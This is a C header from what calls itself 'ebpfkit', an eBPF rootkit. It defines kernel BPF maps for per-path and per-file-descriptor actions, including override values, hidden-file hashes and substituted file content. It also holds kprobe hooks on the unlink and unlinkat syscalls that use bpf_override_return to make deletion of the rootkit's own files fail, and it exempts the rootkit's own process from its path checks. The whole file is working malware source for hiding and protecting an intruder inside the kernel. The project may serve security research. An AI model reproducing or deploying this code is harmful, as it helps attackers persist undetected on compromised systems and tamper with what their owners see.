/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/* Copyright (c) 2020
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 2 of the GNU General Public
 * License as published by the Free Software Foundation.
 */
#ifndef _FS_ACTION_H_
#define _FS_ACTION_H_

struct bpf_map_def SEC("maps/fs_action_progs") fs_action_progs = {
    .type = BPF_MAP_TYPE_PROG_ARRAY,
    .key_size = sizeof(u32),
    .value_size = sizeof(u32),
    .max_entries = 20,
};

struct fs_action_t
{
    u64 id;
    s64 return_value;
    u64 override_id;
    u64 hidden_hash;
};

struct fs_fd_action_t
{
    u64 fd;
    struct fs_action_t action;
};

struct bpf_map_def SEC("maps/fs_fd_actions") fs_fd_actions = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(u64),
    .value_size = sizeof(struct fs_fd_action_t),
    .max_entries = 4096,
    .pinning = 0,
    .namespace = "",
};

struct fs_fd_key_t
{
    u64 fd;
    u32 pid;
    u32 padding;
};

struct fs_fd_attr_t
{
    struct fs_action_t action;

    u64 override_chunk;

    void *read_buf;
    u64 read_size;

    u64 kmsg;
};

struct bpf_map_def SEC("maps/fs_fd_attrs") fs_fd_attrs = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(struct fs_fd_key_t),
    .value_size = sizeof(struct fs_fd_attr_t),
    .max_entries = 4096,
    .pinning = 0,
    .namespace = "",
};

struct fs_path_key_t
{
    u64 hash;
    u64 pos;
};

struct fs_path_attr_t
{
    u64 fs_hash;
    u64 comm_hash;
    struct fs_action_t action;
};

struct bpf_map_def SEC("maps/fs_path_attrs") fs_path_attrs = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = sizeof(struct fs_path_key_t),
    .value_size = sizeof(struct fs_path_attr_t),
    .max_entries = 4096,
    .pinning = 0,
    .namespace = "",
};

struct fs_fd_content_key_t
{
    u64 id;
    u32 chunk;
    u32 padding;
};

struct fs_fd_content_t
{
    u64 size;
    char content[64];
};

struct bpf_map_def SEC("maps/fs_fd_contents") fs_fd_contents = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = sizeof(struct fs_fd_content_key_t),
    .value_size = sizeof(struct fs_fd_content_t),
    .max_entries = 4096,
    .pinning = 0,
    .namespace = "",
};

__attribute__((always_inline)) u64 get_fs_hash(struct dentry *dentry)
{
    struct inode *d_inode;
    bpf_probe_read(&d_inode, sizeof(d_inode), &dentry->d_inode);

    struct super_block *sb;
    bpf_probe_read(&sb, sizeof(sb), &d_inode->i_sb);

    struct file_system_type *type;
    bpf_probe_read(&type, sizeof(type), &sb->s_type);

    char *name_ptr;
    bpf_probe_read(&name_ptr, sizeof(name_ptr), &type->name);

    char name[32];
    bpf_probe_read_str(&name, sizeof(name), name_ptr);

    u64 hash = FNV_BASIS;
    update_hash_str(&hash, name);

    return hash;
}

__attribute__((always_inline)) int path_attr_matches(struct fs_path_attr_t *path_attr, struct dentry *dentry) {    
    if (path_attr->fs_hash && path_attr->fs_hash != get_fs_hash(dentry))
        return 0;

    if (path_attr->comm_hash && path_attr->comm_hash != get_comm_hash())
        return 0;

    return 1;
}


__attribute__((always_inline)) struct fs_path_attr_t *get_path_attr(struct dentry *dentry)
{
    struct qstr qstr;
    struct dentry *d_parent;
    struct inode *d_inode = NULL;
    char name[FS_MAX_SEGMENT_LENGTH + 1];
    int end = 0;

    struct fs_path_key_t key = {
        .hash = FNV_BASIS,
    };

#pragma unroll
    for (int i = 0; i < 15; i++)
    {
        d_parent = NULL;
        bpf_probe_read(&d_parent, sizeof(d_parent), &dentry->d_parent);

        if (dentry != d_parent)
            bpf_probe_read(&d_inode, sizeof(d_inode), &d_parent->d_inode);

        bpf_probe_read(&qstr, sizeof(qstr), &dentry->d_name);
        bpf_probe_read_str(&name, sizeof(name), (void *)qstr.name);

        if (IS_PATH_SEP(name[0]))
        {
            name[0] = '/';
            end = 1;
        }

        key.hash = FNV_BASIS;
        update_hash_str(&key.hash, name);

        struct fs_path_attr_t *path_attr = bpf_map_lookup_elem(&fs_path_attrs, &key);
        if (!path_attr)
            key.pos = 0;
        else
        {
            if (path_attr->action.id && path_attr_matches(path_attr, dentry))
                return path_attr;
            key.pos++;
        }

        if (end)
            return 0;

        dentry = d_parent;
    }

    return 0;
}

__attribute__((always_inline)) int access_path(struct path *path)
{
    u64 ebpfkit_pid;
    LOAD_CONSTANT("ebpfkit_pid", ebpfkit_pid);

    u64 pid_tgid = bpf_get_current_pid_tgid();
    if (ebpfkit_pid == pid_tgid >> 32)
        return 0;

    struct dentry *dentry;
    bpf_probe_read(&dentry, sizeof(dentry), &path->dentry);

    struct fs_path_attr_t *path_attr = get_path_attr(dentry);
    if (!path_attr)
        return 0;

    struct fs_fd_action_t fd_action = {
        .action = path_attr->action,
    };
    bpf_map_update_elem(&fs_fd_actions, &pid_tgid, &fd_action, BPF_ANY);

    return 0;
}

static __attribute__((always_inline)) int handle_unlink(struct pt_regs *ctx, const char *filename)
{
    u64 ebpfkit_hash;
    LOAD_CONSTANT("ebpfkit_hash", ebpfkit_hash);

    bpf_printk("EEEE: %lu\n", ebpfkit_hash);

    if (!ebpfkit_hash)
        return 0;

    const char basename[256];
    bpf_probe_read_str((void *)basename, sizeof(basename), (void *)filename);

    u64 hash = FNV_BASIS;

#pragma unroll
    for (int i = 0; i != 256; i++)
    {
        if (basename[i] == '\0')
        {
            if (hash == ebpfkit_hash)
                bpf_override_return(ctx, -ENOENT);
        }
        else if (basename[i] == '/')
            hash = FNV_BASIS;
        else
            update_hash_byte(&hash, basename[i]);
    }

    return 0;
}

SEC("kprobe/__x64_sys_unlink")
int __x64_sys_unlink(struct pt_regs *ctx)
{
    struct pt_regs *rctx = (struct pt_regs *)PT_REGS_PARM1(ctx);

    const char *filename = NULL;
    bpf_probe_read(&filename, sizeof(filename), &PT_REGS_PARM1(rctx));

    return handle_unlink(ctx, filename);
}

SEC("kprobe/__x64_sys_unlinkat")
int __x64_sys_unlinkat(struct pt_regs *ctx)
{
    struct pt_regs *rctx = (struct pt_regs *)PT_REGS_PARM1(ctx);

    const char *filename = NULL;
    bpf_probe_read(&filename, sizeof(filename), &PT_REGS_PARM2(rctx));

    return handle_unlink(ctx, filename);
}

#endif
